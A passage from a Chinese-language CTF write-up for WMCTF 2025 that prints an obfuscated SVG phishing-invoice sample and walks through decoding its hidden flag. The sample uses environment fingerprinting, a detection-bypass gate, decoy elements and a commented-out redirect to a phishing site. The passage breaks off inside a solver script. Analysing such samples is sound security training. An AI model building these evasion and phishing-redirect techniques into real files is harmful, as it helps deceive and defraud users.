modified by fingerprinting</span></span></span><br><span class="line"><span class="language-javascript">          ];</span></span><br><span class="line"><span class="language-javascript">          </span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> validCount = checks.<span class="title function_">filter</span>(<span class="title class_">Boolean</span>).<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> validCount &gt;= <span class="number">6</span>; <span class="comment">// Require most checks to pass</span></span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// Layer 4: Steganographic data hidden in mathematical sequences</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> fibSequence = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">34</span>,<span class="number">55</span>,<span class="number">89</span>,<span class="number">144</span>,<span class="number">233</span>,<span class="number">377</span>,<span class="number">610</span>,<span class="number">987</span>,<span class="number">1597</span>,<span class="number">2584</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> primeSequence = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>];</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// Hidden data in sequence differences (steganography)</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> hiddenIndices = [];</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; fibSequence.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> diff = fibSequence[i] - fibSequence[i-<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">if</span> (diff &gt; <span class="number">0</span> &amp;&amp; diff &lt; polymorphicData.<span class="property">length</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            hiddenIndices.<span class="title function_">push</span>(diff % polymorphicData.<span class="property">length</span>);</span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> generateDynamicKey = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> timeComponent = (<span class="title class_">Date</span>.<span class="title function_">now</span>() % <span class="number">86400000</span>).<span class="title function_">toString</span>(<span class="number">36</span>); <span class="comment">// Daily changing component</span></span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> envComponent = (globalSeed ^ <span class="number">0xDEADBEEF</span>).<span class="title function_">toString</span>(<span class="number">36</span>);</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> browserComponent = (navigator.<span class="property">userAgent</span>.<span class="property">length</span> * screen.<span class="property">colorDepth</span>).<span class="title function_">toString</span>(<span class="number">36</span>);</span></span><br><span class="line"><span class="language-javascript">          </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> staticKey = <span class="string">&#x27;WMCTF_2025_SVG_ANALYSIS&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> staticKey;</span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> decryptionPipeline = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">if</span> (!<span class="title function_">envValidation</span>()) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Environment validation failed&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">          </span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> dynamicKey = <span class="title function_">generateDynamicKey</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> realDataIndices = [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]; <span class="comment">// Skip decoy data</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> encryptedParts = [];</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; realDataIndices.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">var</span> idx = realDataIndices[i];</span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">if</span> (idx &lt; polymorphicData.<span class="property">length</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                encryptedParts.<span class="title function_">push</span>(polymorphicData[idx]);</span></span><br><span class="line"><span class="language-javascript">              &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Found encrypted parts:&#x27;</span>, encryptedParts.<span class="property">length</span>);</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> stage1Results = [];</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; encryptedParts.<span class="property">length</span>; j++) &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">var</span> part = encryptedParts[j];</span></span><br><span class="line"><span class="language-javascript">              </span></span><br><span class="line"><span class="language-javascript">              <span class="comment">// Convert Unicode escape sequences to characters</span></span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">var</span> decoded = part.<span class="title function_">replace</span>(<span class="regexp">/4oyM|4p2[a-zA-Z0-9]|77i[a-zA-Z0-9]/g</span>, <span class="keyword">function</span>(<span class="params">match</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> charMap = &#123;</span></span><br><span class="line"><span class="language-javascript">                  <span class="string">&#x27;4p2V&#x27;</span>: <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;4p2P&#x27;</span>: <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;4p2F&#x27;</span>: <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;4p2g&#x27;</span>: <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;4p2a&#x27;</span>: <span class="string">&#x27;P&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                  <span class="string">&#x27;4p2c&#x27;</span>: <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;4oyI&#x27;</span>: <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;4p2T&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;77iP&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;4p2S&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                  <span class="string">&#x27;4p2L&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;4p2D&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;4p2O&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;4p2M&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;4p2d&#x27;</span>: <span class="string">&#x27;f&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                  <span class="string">&#x27;77iO&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;4p2b&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;4p2Z&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;4oyL&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;77iM&#x27;</span>: <span class="string">&#x27;i&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                  <span class="string">&#x27;4p2J&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;4p2B&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;4p2R&#x27;</span>: <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;4p2h&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4p2X&#x27;</span>: <span class="string">&#x27;n&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                  <span class="string">&#x27;4p2H&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;4pyx&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;4p2I&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;4p2A&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;4p2C&#x27;</span>: <span class="string">&#x27;s&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                  <span class="string">&#x27;4p2Y&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;4p2j&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;77iK&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;4p2U&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;4p2K&#x27;</span>: <span class="string">&#x27;t&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                  <span class="string">&#x27;4p2N&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;4p2E&#x27;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;4oyM&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;77iL&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;4py9&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                  <span class="string">&#x27;77iN&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4p2W&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4p2Q&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4p2G&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4py8&#x27;</span>: <span class="string">&#x27;!&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                  <span class="string">&#x27;4py7&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;4py6&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;4py5&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;4py4&#x27;</span>: <span class="string">&#x27;!&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                &#125;;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> charMap[match] || <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">              &#125;);</span></span><br><span class="line"><span class="language-javascript">              </span></span><br><span class="line"><span class="language-javascript">              stage1Results.<span class="title function_">push</span>(decoded);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> combined = stage1Results.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Stage 1 result:&#x27;</span>, combined);</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> finalResult = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; combined.<span class="property">length</span>; k++) &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">var</span> char = combined.<span class="title function_">charCodeAt</span>(k);</span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">var</span> keyChar = dynamicKey.<span class="title function_">charCodeAt</span>(k % dynamicKey.<span class="property">length</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">var</span> transformed = char ^ (keyChar % <span class="number">32</span>); <span class="comment">// Reduced XOR for readability</span></span></span><br><span class="line"><span class="language-javascript">              finalResult += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(transformed);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> finalResult;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">          &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Decryption failed:&#x27;</span>, error.<span class="property">message</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">       </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> mathematicalObfuscation = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">       </span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> phi = <span class="number">1.618033988749895</span>; <span class="comment">// Golden ratio</span></span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> pi = <span class="number">3.141592653589793</span>;   <span class="comment">// Pi</span></span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> e = <span class="number">2.718281828459045</span>;    <span class="comment">// Euler&#x27;s number</span></span></span><br><span class="line"><span class="language-javascript">          </span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> mathKey = <span class="title class_">Math</span>.<span class="title function_">floor</span>(phi * <span class="number">1000</span>) + <span class="title class_">Math</span>.<span class="title function_">floor</span>(pi * <span class="number">1000</span>) + <span class="title class_">Math</span>.<span class="title function_">floor</span>(e * <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">          </span></span><br><span class="line"><span class="language-javascript">         </span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">window</span>.<span class="property">mathSegments</span> = [</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">btoa</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(mathKey % <span class="number">256</span>) + segments[<span class="number">0</span>]),</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">btoa</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((mathKey * <span class="number">2</span>) % <span class="number">256</span>) + segments[<span class="number">1</span>]),</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">btoa</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((mathKey * <span class="number">3</span>) % <span class="number">256</span>) + segments[<span class="number">2</span>]),</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">btoa</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((mathKey * <span class="number">4</span>) % <span class="number">256</span>) + segments[<span class="number">3</span>]),</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">btoa</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((mathKey * <span class="number">5</span>) % <span class="number">256</span>) + segments[<span class="number">4</span>])</span></span><br><span class="line"><span class="language-javascript">          ];</span></span><br><span class="line"><span class="language-javascript">          </span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> mathKey;</span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">       </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> mathKey = <span class="title function_">mathematicalObfuscation</span>();</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">       </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (detectionBypass &amp;&amp; !jXKuzdDMGk &amp;&amp; <span class="title function_">verification</span>()) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">constructPayload</span>();</span></span><br><span class="line"><span class="language-javascript">          </span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">window</span>.<span class="property">extractFlag</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">hiddenData</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> encoded = <span class="title function_">atob</span>(<span class="variable language_">window</span>.<span class="property">hiddenData</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> key = <span class="string">&#x27;WMCTF2025&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> decoded = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; encoded.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">                  decoded += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(</span></span><br><span class="line"><span class="language-javascript">                    encoded.<span class="title function_">charCodeAt</span>(i) ^ key.<span class="title function_">charCodeAt</span>(i % key.<span class="property">length</span>)</span></span><br><span class="line"><span class="language-javascript">                  );</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Extracted flag:&#x27;</span>, decoded);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> decoded;</span></span><br><span class="line"><span class="language-javascript">              &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Flag extraction failed&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">          &#125;;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Decoy functions to confuse analysis</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">generateFakeTraffic</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> fakeUrls = [</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&#x27;https://api.example.com/data&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&#x27;https://cdn.jsdelivr.net/npm/package&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&#x27;https://fonts.googleapis.com/css&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      ];</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// These would normally make requests but are disabled for CTF</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">createFakeElements</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// Create invisible elements with misleading data</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> hiddenDiv = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      hiddenDiv.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      hiddenDiv.<span class="property">innerHTML</span> = <span class="title function_">atob</span>(<span class="string">&#x27;RmFrZSBmbGFnOiBXTUNURntub3RfdGhlX3JlYWxfZmxhZ30=&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(hiddenDiv);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Initialize decoy functions</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">generateFakeTraffic</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">createFakeElements</span>();</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Add click handler for the invoice</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (detectionBypass &amp;&amp; !jXKuzdDMGk) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// This would normally redirect to phishing site</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// window.location.href = &#x27;https://fake-payment-portal.com&#x27;;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Invoice clicked - in real attack, this would redirect to phishing site&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  ]]&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到映射表</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">charMap</span> <span class="operator">=</span> &#123;</span><br><span class="line">  <span class="string">&#x27;4p2V&#x27;</span>:<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;4p2P&#x27;</span>:<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;4p2F&#x27;</span>:<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;4p2g&#x27;</span>:<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;4p2a&#x27;</span>:<span class="string">&#x27;P&#x27;</span>,  <span class="string">&#x27;4p2c&#x27;</span>:<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;4oyI&#x27;</span>:<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;4p2T&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;77iP&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;4p2S&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,  <span class="string">&#x27;4p2L&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;4p2D&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;4p2O&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;4p2M&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;4p2d&#x27;</span>:<span class="string">&#x27;f&#x27;</span>,  <span class="string">&#x27;77iO&#x27;</span>:<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;4p2b&#x27;</span>:<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;4p2Z&#x27;</span>:<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;4oyL&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;77iM&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,  <span class="string">&#x27;4p2J&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;4p2B&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;4p2R&#x27;</span>:<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;4p2h&#x27;</span>:<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;4p2X&#x27;</span>:<span class="string">&#x27;n&#x27;</span>,  <span class="string">&#x27;4p2H&#x27;</span>:<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;4pyx&#x27;</span>:<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;4p2I&#x27;</span>:<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;4p2A&#x27;</span>:<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;4p2C&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,  <span class="string">&#x27;4p2Y&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;4p2j&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;77iK&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;4p2U&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;4p2K&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,  <span class="string">&#x27;4p2N&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;4p2E&#x27;</span>:<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;4oyM&#x27;</span>:<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;77iL&#x27;</span>:<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;4py9&#x27;</span>:<span class="string">&#x27;&#125;&#x27;</span>,  <span class="string">&#x27;77iN&#x27;</span>:<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;4p2W&#x27;</span>:<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;4p2Q&#x27;</span>:<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;4p2G&#x27;</span>:<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;4py8&#x27;</span>:<span class="string">&#x27;!&#x27;</span>,  <span class="string">&#x27;4py7&#x27;</span>:<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;4py6&#x27;</span>:<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;4py5&#x27;</span>:<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;4py4&#x27;</span>:<span class="string">&#x27;!&#x27;</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>Token替换规则&#x2F;&#x2F; &#x2F;4oyM|4p2[a-zA-Z0-9]|77i[a-zA-Z0-9]&#x2F;g&#x2F;&#x2F; </p>
<p>有很多干扰项，其中真正有效的数据位于下标 [3..7] 五个元素</p>
<p>对这五个字符串经过一系列解密</p>
<p>wmctwf{SVG_Pchishing_iAtt{aic_k_{Dgeitte{cit_io{ng_iEtv{ais_io{ng}i!t!{!i!_!</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 